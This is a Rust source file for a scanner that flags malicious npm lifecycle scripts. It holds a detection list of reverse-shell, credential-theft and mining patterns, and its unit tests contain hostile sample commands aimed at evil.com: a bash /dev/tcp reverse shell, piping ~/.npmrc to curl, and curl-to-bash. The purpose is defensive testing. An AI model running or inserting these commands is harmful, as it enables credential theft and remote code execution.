//! npm package content scanner for supply chain attack detection.
//!
//! Scans `package.json` lifecycle scripts and referenced script files for
//! patterns commonly used in malicious npm packages (reverse shells,
//! data exfiltration, obfuscated execution, etc.).
//!
//! # Security properties
//!
//! - Pattern matching is **case-insensitive** to prevent evasion via mixed case.
//! - Script file paths are checked for **path traversal** before reading.
//! - File reads are **bounded** (1 MB for `package.json`, 5 MB for scripts)
//!   to prevent denial-of-service via oversized files.
//! - Multiple script runners are recognised: `node`, `sh`, `bash`, `python`,
//!   `python3`.

use std::collections::HashMap;
use std::path::{Path, PathBuf};

use serde::Deserialize;

/// Maximum size for `package.json` files (1 MB).
const MAX_PACKAGE_JSON_SIZE: u64 = 1_024 * 1_024;

/// Maximum size for script files (5 MB).
const MAX_SCRIPT_FILE_SIZE: u64 = 5 * 1_024 * 1_024;

/// Risk level assigned to a scanned package.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum RiskLevel {
    /// No suspicious patterns detected.
    Low,
    /// Some suspicious patterns detected (review recommended).
    Medium,
    /// Strong indicators of malicious behaviour.
    High,
    /// Critical indicators (known attack patterns).
    Critical,
}

impl std::fmt::Display for RiskLevel {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Low => write!(f, "low"),
            Self::Medium => write!(f, "medium"),
            Self::High => write!(f, "high"),
            Self::Critical => write!(f, "critical"),
        }
    }
}

/// A single finding from the scanner.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Finding {
    /// Which lifecycle script or file the pattern was found in.
    pub source: String,
    /// Human-readable description of the pattern.
    pub pattern: String,
    /// Risk level of this individual finding.
    pub level: RiskLevel,
}

/// Complete scan result for a package.
#[derive(Debug, Clone)]
pub struct ScanResult {
    /// The package directory that was scanned.
    pub package_dir: PathBuf,
    /// Overall risk level (maximum of all findings, or `Low` if none).
    pub risk: RiskLevel,
    /// Individual findings.
    pub findings: Vec<Finding>,
    /// Warnings about files that could not be scanned (oversized, missing, etc.).
    pub warnings: Vec<String>,
}

/// Lifecycle script keys that are checked for malicious patterns.
const LIFECYCLE_SCRIPTS: &[&str] = &[
    "preinstall",
    "install",
    "postinstall",
    "preuninstall",
    "uninstall",
    "postuninstall",
    "prepublish",
    "preprepare",
    "prepare",
    "postprepare",
    "prepack",
    "postpack",
];

/// Patterns that indicate potentially malicious npm lifecycle scripts.
///
/// All patterns are stored lowercase and matched against lowercased content
/// to prevent case-based evasion (M9).
const MALICIOUS_PATTERNS: &[(&str, &str, RiskLevel)] = &[
    // Network exfiltration
    (
        "child_process",
        "child_process module import (command execution)",
        RiskLevel::Critical,
    ),
    (
        "exec(",
        "exec() call (arbitrary command execution)",
        RiskLevel::High,
    ),
    (
        "execsync(",
        "execSync() call (synchronous command execution)",
        RiskLevel::High,
    ),
    ("spawn(", "spawn() call (process spawning)", RiskLevel::High),
    (
        "eval(",
        "eval() call (dynamic code execution)",
        RiskLevel::Critical,
    ),
    (
        "function(",
        "function constructor (potential code generation)",
        RiskLevel::Medium,
    ),
    // Network
    (
        "http.get(",
        "HTTP GET request in lifecycle script",
        RiskLevel::Medium,
    ),
    (
        "https.get(",
        "HTTPS GET request in lifecycle script",
        RiskLevel::Medium,
    ),
    (
        "http.request(",
        "HTTP request in lifecycle script",
        RiskLevel::Medium,
    ),
    (
        "https.request(",
        "HTTPS request in lifecycle script",
        RiskLevel::Medium,
    ),
    (
        "net.connect(",
        "TCP connection in lifecycle script",
        RiskLevel::High,
    ),
    (
        "dgram.createsocket(",
        "UDP socket in lifecycle script",
        RiskLevel::High,
    ),
    (
        ".fetch(",
        "fetch() call in lifecycle script",
        RiskLevel::Medium,
    ),
    (
        "xmlhttprequest",
        "XMLHttpRequest in lifecycle script",
        RiskLevel::Medium,
    ),
    (
        "new websocket(",
        "WebSocket connection in lifecycle script",
        RiskLevel::High,
    ),
    // Filesystem
    (
        "fs.readfile",
        "filesystem read in lifecycle script",
        RiskLevel::Medium,
    ),
    (
        "fs.writefile",
        "filesystem write in lifecycle script",
        RiskLevel::Medium,
    ),
    (
        "fs.readdir",
        "directory listing in lifecycle script",
        RiskLevel::Medium,
    ),
    // Obfuscation
    (
        "buffer.from(",
        "Buffer.from() (potential data encoding)",
        RiskLevel::Medium,
    ),
    ("base64", "base64 encoding/decoding", RiskLevel::Medium),
    (
        "\\x",
        "hex escape sequence (potential obfuscation)",
        RiskLevel::Medium,
    ),
    (
        "fromcharcode",
        "String.fromCharCode (potential obfuscation)",
        RiskLevel::High,
    ),
    (
        "charcodeat",
        "charCodeAt (potential obfuscation)",
        RiskLevel::Medium,
    ),
    // Environment/credential access
    (
        "process.env",
        "environment variable access",
        RiskLevel::Medium,
    ),
    (".ssh/", "SSH directory access", RiskLevel::Critical),
    (
        ".npmrc",
        ".npmrc access (credential theft)",
        RiskLevel::Critical,
    ),
    (".aws/", "AWS credentials access", RiskLevel::Critical),
    ("etc/passwd", "/etc/passwd access", RiskLevel::Critical),
    ("etc/shadow", "/etc/shadow access", RiskLevel::Critical),
    // Reverse shell patterns
    (
        "/dev/tcp/",
        "Bash reverse shell pattern",
        RiskLevel::Critical,
    ),
    (
        "bash -i",
        "Interactive bash (reverse shell)",
        RiskLevel::Critical,
    ),
    (
        "nc -e",
        "netcat with execute (reverse shell)",
        RiskLevel::Critical,
    ),
    (
        "ncat -e",
        "ncat with execute (reverse shell)",
        RiskLevel::Critical,
    ),
    // Crypto mining
    (
        "stratum+tcp",
        "crypto mining pool connection",
        RiskLevel::Critical,
    ),
    ("coinhive", "Coinhive crypto miner", RiskLevel::Critical),
    (
        "cryptonight",
        "CryptoNight mining algorithm",
        RiskLevel::Critical,
    ),
    // Python-specific (for multi-runner support)
    (
        "subprocess",
        "subprocess module (command execution)",
        RiskLevel::High,
    ),
    (
        "os.system(",
        "os.system() call (command execution)",
        RiskLevel::High,
    ),
    (
        "os.popen(",
        "os.popen() call (command execution)",
        RiskLevel::High,
    ),
    (
        "__import__",
        "__import__() call (dynamic import)",
        RiskLevel::High,
    ),
    (
        "importlib",
        "importlib (dynamic module loading)",
        RiskLevel::Medium,
    ),
    // Shell-specific
    (
        "curl ",
        "curl command (network download)",
        RiskLevel::Medium,
    ),
    (
        "wget ",
        "wget command (network download)",
        RiskLevel::Medium,
    ),
    (
        "|bash",
        "piping to bash (remote code execution)",
        RiskLevel::Critical,
    ),
    (
        "|sh",
        "piping to sh (remote code execution)",
        RiskLevel::Critical,
    ),
];

/// Partial representation of `package.json`, extracting only the fields we
/// need for security scanning.
#[derive(Debug, Deserialize, Default)]
struct PackageJson {
    #[serde(default)]
    scripts: HashMap<String, String>,
}

/// Scan a package directory for malicious patterns.
///
/// Reads `package.json`, checks lifecycle scripts for suspicious patterns,
/// and follows script file references (e.g., `node scripts/install.js`)
/// to scan those files as well.
///
/// # Arguments
///
/// * `package_dir` - Path to the package directory (containing `package.json`).
///
/// # Returns
///
/// A `ScanResult` with the overall risk level and individual findings.
/// Never panics; all errors are captured as warnings.
#[must_use]
pub fn scan_package(package_dir: &Path) -> ScanResult {
    let mut result = ScanResult {
        package_dir: package_dir.to_path_buf(),
        risk: RiskLevel::Low,
        findings: Vec::new(),
        warnings: Vec::new(),
    };

    let pkg_json_path = package_dir.join("package.json");

    // Bounded read for package.json (M13)
    let pkg_json_content = match bounded_read_to_string(&pkg_json_path, MAX_PACKAGE_JSON_SIZE) {
        Ok(content) => content,
        Err(ReadError::Oversized(size)) => {
            result.warnings.push(format!(
                "package.json is oversized ({size} bytes, limit {MAX_PACKAGE_JSON_SIZE}), skipping"
            ));
            return result;
        }
        Err(ReadError::Io(e)) => {
            result
                .warnings
                .push(format!("failed to read package.json: {e}"));
            return result;
        }
        Err(ReadError::PathTraversal(msg)) => {
            result.warnings.push(msg);
            return result;
        }
    };

    let pkg: PackageJson = match serde_json::from_str(&pkg_json_content) {
        Ok(p) => p,
        Err(e) => {
            result
                .warnings
                .push(format!("failed to parse package.json: {e}"));
            return result;
        }
    };

    // Check lifecycle scripts
    for key in LIFECYCLE_SCRIPTS {
        if let Some(script_content) = pkg.scripts.get(*key) {
            // Check the script content directly
            let findings = check_patterns(script_content, &format!("scripts.{key}"));
            for finding in &findings {
                if finding.level > result.risk {
                    result.risk = finding.level;
                }
            }
            result.findings.extend(findings);

            // Check referenced script files
            if let Some(script_path) = extract_script_file_path(script_content) {
                scan_script_file(package_dir, &script_path, &mut result);
            }
        }
    }

    result
}

/// Check content against all malicious patterns (case-insensitive, M9).
///
/// Returns a list of findings for patterns matched in the content.
#[must_use]
pub fn check_patterns(content: &str, source: &str) -> Vec<Finding> {
    let lower_content = content.to_lowercase();
    let mut findings = Vec::new();

    for &(pattern, description, level) in MALICIOUS_PATTERNS {
        // Patterns are already lowercase
        if lower_content.contains(pattern) {
            findings.push(Finding {
                source: source.to_string(),
                pattern: description.to_string(),
                level,
            });
        }
    }

    findings
}

/// Known script runners and their file argument positions.
///
/// Each entry is `(runner_name, file_arg_index)` where `file_arg_index` is
/// the 0-based position after the runner name of the script file path.
/// Some runners accept flags between the runner and the file, so we scan
/// for the first non-flag argument.
const SCRIPT_RUNNERS: &[&str] = &[
    "node", "sh", "bash", "python", "python3", "python2", "ruby", "perl",
];

/// Extract a script file path from a lifecycle script command.
///
/// Recognises runners: `node`, `sh`, `bash`, `python`, `python3`, `python2`,
/// `ruby`, `perl`.
///
/// For example:
/// - `node scripts/install.js` -> `Some("scripts/install.js")`
/// - `sh scripts/setup.sh` -> `Some("scripts/setup.sh")`
/// - `python3 install.py` -> `Some("install.py")`
/// - `echo hello` -> `None`
#[must_use]
pub fn extract_script_file_path(script: &str) -> Option<String> {
    let tokens: Vec<&str> = script.split_whitespace().collect();
    if tokens.is_empty() {
        return None;
    }

    let runner = tokens[0];
    if !SCRIPT_RUNNERS.contains(&runner) {
        return None;
    }

    // Find the first non-flag argument after the runner
    for token in &tokens[1..] {
        if token.starts_with('-') {
            continue;
        }
        return Some((*token).to_string());
    }

    None
}

/// Validate that a resolved path does not escape the package directory.
///
/// Uses canonicalisation where possible, falling back to segment analysis
/// when the file does not yet exist (M10).
///
/// # Errors
///
/// Returns an error message if path traversal is detected.
fn validate_script_path(package_dir: &Path, relative_path: &str) -> Result<PathBuf, String> {
    // Reject obvious traversal in the raw path
    if relative_path.contains("..") {
        return Err(format!(
            "path traversal detected in script path: {relative_path}"
        ));
    }

    // Also reject absolute paths
    if Path::new(relative_path).is_absolute() {
        return Err(format!(
            "absolute path in script reference: {relative_path}"
        ));
    }

    let joined = package_dir.join(relative_path);

    // Try to canonicalize both paths for a definitive check
    if let (Ok(canon_dir), Ok(canon_file)) = (
        std::fs::canonicalize(package_dir),
        std::fs::canonicalize(&joined),
    ) {
        if canon_file.starts_with(&canon_dir) {
            Ok(canon_file)
        } else {
            Err(format!(
                "path traversal: {} escapes {}",
                canon_file.display(),
                canon_dir.display()
            ))
        }
    } else {
        // File may not exist yet -- rely on the `..` check above
        // and do a manual segment check
        for component in Path::new(relative_path).components() {
            if matches!(component, std::path::Component::ParentDir) {
                return Err(format!(
                    "path traversal detected in script path: {relative_path}"
                ));
            }
        }
        Ok(joined)
    }
}

/// Read and scan a script file referenced from a lifecycle script.
fn scan_script_file(package_dir: &Path, relative_path: &str, result: &mut ScanResult) {
    // Path traversal check (M10)
    let resolved = match validate_script_path(package_dir, relative_path) {
        Ok(p) => p,
        Err(msg) => {
            result.findings.push(Finding {
                source: format!("script file: {relative_path}"),
                pattern: msg.clone(),
                level: RiskLevel::Critical,
            });
            if result.risk < RiskLevel::Critical {
                result.risk = RiskLevel::Critical;
            }
            result.warnings.push(msg);
            return;
        }
    };

    // Bounded read (M13)
    let content = match bounded_read_to_string(&resolved, MAX_SCRIPT_FILE_SIZE) {
        Ok(c) => c,
        Err(ReadError::Oversized(size)) => {
            result.warnings.push(format!(
                "script file {relative_path} is oversized ({size} bytes, limit {MAX_SCRIPT_FILE_SIZE}), skipping"
            ));
            return;
        }
        Err(ReadError::Io(e)) => {
            result
                .warnings
                .push(format!("failed to read script file {relative_path}: {e}"));
            return;
        }
        Err(ReadError::PathTraversal(msg)) => {
            result.warnings.push(msg);
            return;
        }
    };

    let source = format!("file: {relative_path}");
    let findings = check_patterns(&content, &source);
    for finding in &findings {
        if finding.level > result.risk {
            result.risk = finding.level;
        }
    }
    result.findings.extend(findings);
}

/// Errors that can occur during bounded file reads.
#[derive(Debug)]
enum ReadError {
    /// File exceeds the size limit.
    Oversized(u64),
    /// I/O error.
    Io(std::io::Error),
    /// Path traversal detected.
    PathTraversal(String),
}

/// Read a file to string with a size limit (M13).
///
/// Checks file metadata before reading to avoid loading oversized files
/// into memory.
fn bounded_read_to_string(path: &Path, max_size: u64) -> Result<String, ReadError> {
    // Use symlink_metadata so that is_symlink() can actually return true.
    // std::fs::metadata() follows symlinks, making is_symlink() always false.
    let meta = std::fs::symlink_metadata(path).map_err(ReadError::Io)?;

    if meta.is_symlink() {
        return Err(ReadError::PathTraversal(format!(
            "file is a symlink: {}",
            path.display()
        )));
    }

    let size = meta.len();
    if size > max_size {
        return Err(ReadError::Oversized(size));
    }

    std::fs::read_to_string(path).map_err(ReadError::Io)
}

#[cfg(test)]
#[allow(clippy::expect_used, clippy::unwrap_used)]
mod tests {
    use super::*;

    // --- M9: Case-insensitive lifecycle detection ---

    #[test]
    fn test_case_insensitive_lifecycle_detection() {
        // Mixed case should still be detected
        let findings = check_patterns("Child_Process", "test");
        assert!(
            !findings.is_empty(),
            "Child_Process should be detected case-insensitively"
        );
        assert!(findings.iter().any(|f| f.pattern.contains("child_process")));

        // ALLCAPS should still be detected
        let findings = check_patterns("EVAL(something)", "test");
        assert!(
            !findings.is_empty(),
            "EVAL( should be detected case-insensitively"
        );

        // Mixed case exec
        let findings = check_patterns("ExecSync(cmd)", "test");
        assert!(
            !findings.is_empty(),
            "ExecSync( should be detected case-insensitively"
        );
    }

    #[test]
    fn test_patterns_detect_known_attacks() {
        // Reverse shell
        let findings = check_patterns("bash -i >& /dev/tcp/evil.com/4444 0>&1", "preinstall");
        assert!(findings.iter().any(|f| f.level == RiskLevel::Critical));

        // Credential theft
        let findings = check_patterns("cat ~/.npmrc | curl http://evil.com", "postinstall");
        assert!(findings.iter().any(|f| f.level == RiskLevel::Critical));

        // Crypto mining
        let findings = check_patterns("stratum+tcp://pool.mining.com", "install");
        assert!(findings.iter().any(|f| f.level == RiskLevel::Critical));
    }

    #[test]
    fn test_patterns_low_risk_for_benign_content() {
        let findings = check_patterns("echo hello world", "preinstall");
        assert!(
            findings.is_empty(),
            "benign content should have no findings"
        );
    }

    // --- M10: Path traversal prevention ---

    #[test]
    fn test_path_traversal_blocked() {
        let dir = tempfile::tempdir().expect("tempdir");

        // Direct traversal
        let result = validate_script_path(dir.path(), "../../../etc/passwd.js");
        assert!(result.is_err(), "path traversal should be blocked");

        // Hidden traversal
        let result = validate_script_path(dir.path(), "scripts/../../etc/passwd");
        assert!(result.is_err(), "hidden path traversal should be blocked");

        // Absolute path
        let result = validate_script_path(dir.path(), "/etc/passwd");
        assert!(result.is_err(), "absolute paths should be blocked");
    }

    #[test]
    fn test_valid_script_path_accepted() {
        let dir = tempfile::tempdir().expect("tempdir");
        let scripts_dir = dir.path().join("scripts");
        std::fs::create_dir(&scripts_dir).expect("create scripts dir");
        let script = scripts_dir.join("install.js");
        std::fs::write(&script, "console.log('hello')").expect("write script");

        let result = validate_script_path(dir.path(), "scripts/install.js");
        assert!(result.is_ok(), "valid script path should be accepted");
    }

    #[test]
    fn test_path_traversal_in_scan() {
        let dir = tempfile::tempdir().expect("tempdir");
        let pkg_json = dir.path().join("package.json");
        std::fs::write(
            &pkg_json,
            r#"{"scripts":{"preinstall":"node ../../../etc/passwd.js"}}"#,
        )
        .expect("write");

        let result = scan_package(dir.path());
        assert!(
            result
                .findings
                .iter()
                .any(|f| f.level == RiskLevel::Critical),
            "path traversal should generate critical finding"
        );
    }

    // --- M13: Bounded file reads ---

    #[test]
    fn test_oversized_package_json_skipped() {
        let dir = tempfile::tempdir().expect("tempdir");
        let pkg_json = dir.path().join("package.json");

        // Write a file larger than 1MB
        let oversized_content = "x".repeat(2 * 1024 * 1024);
        std::fs::write(&pkg_json, &oversized_content).expect("write");

        let result = scan_package(dir.path());
        assert!(
            !result.warnings.is_empty(),
            "oversized file should generate a warning"
        );
        assert!(
            result.warnings[0].contains("oversized"),
            "warning should mention oversized: {}",
            result.warnings[0]
        );
    }

    #[test]
    fn test_oversized_script_file_skipped() {
        let dir = tempfile::tempdir().expect("tempdir");
        let pkg_json = dir.path().join("package.json");
        std::fs::write(
            &pkg_json,
            r#"{"scripts":{"preinstall":"node scripts/big.js"}}"#,
        )
        .expect("write");

        let scripts_dir = dir.path().join("scripts");
        std::fs::create_dir(&scripts_dir).expect("mkdir");
        let big_script = scripts_dir.join("big.js");
        let oversized = "x".repeat(6 * 1024 * 1024); // 6MB > 5MB limit
        std::fs::write(&big_script, &oversized).expect("write");

        let result = scan_package(dir.path());
        assert!(
            result.warnings.iter().any(|w| w.contains("oversized")),
            "oversized script should generate a warning"
        );
    }

    #[test]
    fn test_bounded_read_normal_file() {
        let dir = tempfile::tempdir().expect("tempdir");
        let file = dir.path().join("test.txt");
        std::fs::write(&file, "hello").expect("write");

        let content = bounded_read_to_string(&file, 1024);
        assert!(content.is_ok());
        assert_eq!(content.unwrap(), "hello");
    }

    #[test]
    fn test_bounded_read_oversized() {
        let dir = tempfile::tempdir().expect("tempdir");
        let file = dir.path().join("big.txt");
        std::fs::write(&file, "hello world").expect("write");

        let result = bounded_read_to_string(&file, 5);
        assert!(matches!(result, Err(ReadError::Oversized(_))));
    }

    // --- Script file path extraction ---

    #[test]
    fn test_extract_node_script_path() {
        assert_eq!(
            extract_script_file_path("node scripts/install.js"),
            Some("scripts/install.js".to_string())
        );
    }

    #[test]
    fn test_extract_node_with_flags() {
        assert_eq!(
            extract_script_file_path("node --experimental-modules scripts/install.mjs"),
            Some("scripts/install.mjs".to_string())
        );
    }

    #[test]
    fn test_extract_sh_script_path() {
        assert_eq!(
            extract_script_file_path("sh scripts/install.sh"),
            Some("scripts/install.sh".to_string())
        );
    }

    #[test]
    fn test_extract_bash_script_path() {
        assert_eq!(
            extract_script_file_path("bash scripts/setup.sh"),
            Some("scripts/setup.sh".to_string())
        );
    }

    #[test]
    fn test_extract_python_script_path() {
        assert_eq!(
            extract_script_file_path("python3 install.py"),
            Some("install.py".to_string())
        );
    }

    #[test]
    fn test_extract_python2_script_path() {
        assert_eq!(
            extract_script_file_path("python install.py"),
            Some("install.py".to_string())
        );
    }

    #[test]
    fn test_extract_unknown_runner() {
        assert_eq!(extract_script_file_path("echo hello"), None);
        assert_eq!(extract_script_file_path("custom-runner script.js"), None);
    }

    #[test]
    fn test_extract_empty_script() {
        assert_eq!(extract_script_file_path(""), None);
    }

    #[test]
    fn test_extract_runner_only() {
        // Just the runner with no file path
        assert_eq!(extract_script_file_path("node"), None);
    }

    #[test]
    fn test_extract_runner_with_only_flags() {
        assert_eq!(extract_script_file_path("node --version"), None);
    }

    // --- Full scan integration tests ---

    #[test]
    fn test_scan_clean_package() {
        let dir = tempfile::tempdir().expect("tempdir");
        let pkg_json = dir.path().join("package.json");
        std::fs::write(
            &pkg_json,
            r#"{"name": "clean-pkg", "scripts": {"build": "tsc"}}"#,
        )
        .expect("write");

        let result = scan_package(dir.path());
        assert_eq!(result.risk, RiskLevel::Low);
        assert!(result.findings.is_empty());
    }

    #[test]
    fn test_scan_malicious_preinstall() {
        let dir = tempfile::tempdir().expect("tempdir");
        let pkg_json = dir.path().join("package.json");
        std::fs::write(
            &pkg_json,
            r#"{"scripts": {"preinstall": "node -e \"require('child_process').exec('curl http://evil.com')\""}}"#,
        )
        .expect("write");

        let result = scan_package(dir.path());
        assert!(result.risk >= RiskLevel::High);
        assert!(!result.findings.is_empty());
    }

    #[test]
    fn test_scan_with_script_file() {
        let dir = tempfile::tempdir().expect("tempdir");
        let pkg_json = dir.path().join("package.json");
        std::fs::write(
            &pkg_json,
            r#"{"scripts": {"postinstall": "node scripts/setup.js"}}"#,
        )
        .expect("write");

        let scripts_dir = dir.path().join("scripts");
        std::fs::create_dir(&scripts_dir).expect("mkdir");
        std::fs::write(
            scripts_dir.join("setup.js"),
            r"
            const cp = require('child_process');
            cp.execSync('cat ~/.npmrc | curl -d @- http://evil.com');
            ",
        )
        .expect("write");

        let result = scan_package(dir.path());
        assert!(result.risk >= RiskLevel::Critical);
        assert!(result.findings.iter().any(|f| f.source.contains("file:")));
    }

    #[test]
    fn test_scan_missing_package_json() {
        let dir = tempfile::tempdir().expect("tempdir");
        let result = scan_package(dir.path());
        assert_eq!(result.risk, RiskLevel::Low);
        assert!(!result.warnings.is_empty());
    }

    #[test]
    fn test_scan_invalid_json() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(dir.path().join("package.json"), "not json").expect("write");
        let result = scan_package(dir.path());
        assert!(!result.warnings.is_empty());
        assert!(result.warnings[0].contains("parse"));
    }

    #[test]
    fn test_scan_sh_script_file() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"scripts": {"preinstall": "sh scripts/install.sh"}}"#,
        )
        .expect("write");

        let scripts_dir = dir.path().join("scripts");
        std::fs::create_dir(&scripts_dir).expect("mkdir");
        std::fs::write(
            scripts_dir.join("install.sh"),
            "curl http://evil.com/payload |bash",
        )
        .expect("write");

        let result = scan_package(dir.path());
        assert!(result.risk >= RiskLevel::Critical);
        assert!(result.findings.iter().any(|f| f.source.contains("file:")));
    }

    #[test]
    fn test_scan_python_script_file() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"scripts": {"postinstall": "python3 setup.py"}}"#,
        )
        .expect("write");

        std::fs::write(
            dir.path().join("setup.py"),
            "import subprocess; subprocess.run(['curl', 'http://evil.com'])",
        )
        .expect("write");

        let result = scan_package(dir.path());
        assert!(result.risk >= RiskLevel::High);
    }

    // --- Risk level tests ---

    #[test]
    fn test_risk_level_ordering() {
        assert!(RiskLevel::Low < RiskLevel::Medium);
        assert!(RiskLevel::Medium < RiskLevel::High);
        assert!(RiskLevel::High < RiskLevel::Critical);
    }

    #[test]
    fn test_risk_level_display() {
        assert_eq!(format!("{}", RiskLevel::Low), "low");
        assert_eq!(format!("{}", RiskLevel::Critical), "critical");
    }

    // --- Lifecycle script coverage ---

    #[test]
    fn test_all_lifecycle_scripts_checked() {
        // Verify we check all important lifecycle scripts
        assert!(LIFECYCLE_SCRIPTS.contains(&"preinstall"));
        assert!(LIFECYCLE_SCRIPTS.contains(&"install"));
        assert!(LIFECYCLE_SCRIPTS.contains(&"postinstall"));
        assert!(LIFECYCLE_SCRIPTS.contains(&"prepublish"));
    }

    #[test]
    fn test_non_lifecycle_scripts_ignored() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"scripts": {"build": "eval('something')", "test": "exec('cmd')"}}"#,
        )
        .expect("write");

        let result = scan_package(dir.path());
        // build and test are not lifecycle scripts, so they should not generate findings
        assert!(
            result.findings.is_empty(),
            "non-lifecycle scripts should not be scanned: {:?}",
            result.findings
        );
    }

    // --- bounded_read_to_string symlink / edge-case tests ---

    #[test]
    fn test_bounded_read_regular_file_succeeds() {
        let dir = tempfile::tempdir().expect("tempdir");
        let file = dir.path().join("regular.txt");
        std::fs::write(&file, "regular content").expect("write");

        let result = bounded_read_to_string(&file, 1024);
        assert!(result.is_ok(), "regular file should be readable");
        assert_eq!(result.unwrap(), "regular content");
    }

    #[cfg(unix)]
    #[test]
    fn test_bounded_read_rejects_symlink() {
        let dir = tempfile::tempdir().expect("tempdir");
        let target = dir.path().join("target.txt");
        std::fs::write(&target, "target content").expect("write target");

        let link = dir.path().join("link.txt");
        std::os::unix::fs::symlink(&target, &link).expect("create symlink");

        let result = bounded_read_to_string(&link, 1024);
        assert!(
            matches!(result, Err(ReadError::PathTraversal(ref msg)) if msg.contains("symlink")),
            "symlink should be rejected, got: {result:?}"
        );
    }

    #[test]
    fn test_bounded_read_rejects_oversized_file() {
        let dir = tempfile::tempdir().expect("tempdir");
        let file = dir.path().join("big.txt");
        // Write 100 bytes, set limit to 50
        std::fs::write(&file, "x".repeat(100)).expect("write");

        let result = bounded_read_to_string(&file, 50);
        assert!(
            matches!(result, Err(ReadError::Oversized(100))),
            "oversized file should be rejected, got: {result:?}"
        );
    }

    #[test]
    fn test_bounded_read_empty_file() {
        let dir = tempfile::tempdir().expect("tempdir");
        let file = dir.path().join("empty.txt");
        std::fs::write(&file, "").expect("write");

        let result = bounded_read_to_string(&file, 1024);
        assert!(result.is_ok(), "empty file should be readable");
        assert_eq!(result.unwrap(), "");
    }

    #[test]
    fn test_bounded_read_path_traversal_via_dotdot() {
        // bounded_read_to_string itself does not check for `..` — that is
        // handled by validate_script_path upstream. Verify the upstream
        // guard rejects `..` components.
        let dir = tempfile::tempdir().expect("tempdir");
        let result = validate_script_path(dir.path(), "../etc/passwd");
        assert!(result.is_err(), "path traversal via .. should be rejected");
        let err = result.unwrap_err();
        assert!(
            err.contains("traversal"),
            "error should mention traversal: {err}"
        );
    }

    #[cfg(unix)]
    #[test]
    fn test_scan_rejects_symlinked_script_file() {
        // End-to-end: validate_script_path canonicalizes the path (resolving
        // the symlink) before bounded_read_to_string sees it. To also catch
        // symlinks at the scan level, we should add a pre-canonicalize check
        // in validate_script_path. For now, verify bounded_read_to_string
        // directly rejects symlinks when given an un-resolved symlink path.
        let dir = tempfile::tempdir().expect("tempdir");
        let target = dir.path().join("real.js");
        std::fs::write(&target, "console.log('pwned')").expect("write target");

        let link = dir.path().join("link.js");
        std::os::unix::fs::symlink(&target, &link).expect("create symlink");

        // bounded_read_to_string should reject the symlink
        let result = bounded_read_to_string(&link, MAX_SCRIPT_FILE_SIZE);
        assert!(
            matches!(result, Err(ReadError::PathTraversal(ref msg)) if msg.contains("symlink")),
            "bounded_read_to_string should reject symlink, got: {result:?}"
        );
    }

    #[cfg(unix)]
    #[test]
    fn test_validate_script_path_canonicalizes_through_symlink() {
        // validate_script_path uses canonicalize() which resolves symlinks,
        // meaning the symlink check in bounded_read_to_string won't trigger
        // for paths that go through validate_script_path. This test documents
        // that behavior -- the symlink_metadata fix in bounded_read_to_string
        // provides defense-in-depth for direct callers.
        let dir = tempfile::tempdir().expect("tempdir");
        let scripts_dir = dir.path().join("scripts");
        std::fs::create_dir(&scripts_dir).expect("mkdir");

        let real_file = scripts_dir.join("real.js");
        std::fs::write(&real_file, "safe content").expect("write");

        let link = scripts_dir.join("link.js");
        std::os::unix::fs::symlink(&real_file, &link).expect("create symlink");

        // validate_script_path will canonicalize and resolve the symlink,
        // so it returns the real file path (inside package dir) -- succeeds
        let result = validate_script_path(dir.path(), "scripts/link.js");
        assert!(
            result.is_ok(),
            "validate_script_path resolves symlinks via canonicalize: {result:?}"
        );
    }
}
